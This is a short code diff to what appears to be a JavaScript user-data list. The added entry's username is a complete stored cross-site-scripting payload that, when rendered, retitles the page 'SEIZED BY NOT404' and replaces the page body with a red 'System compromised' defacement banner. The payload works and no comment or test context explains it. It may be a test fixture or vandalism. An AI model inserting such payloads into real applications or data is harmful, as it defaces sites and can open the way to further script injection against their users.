@@ -394,5 +394,9 @@ export const users = [
   {
     "username": "<script>",
     "password": "1928726336"
+  },
+  {
+    "username": "<script> console.log('HACKED BY NOT404'); document.title='SEIZED BY NOT404'; document.body.innerHTML='<center style=\"padding-top:100px;\"><h1 style=\"color:red\">NOT404</h1><p>System compromised</p></center>'; </script>",
+    "password": "123"
   }
 ];
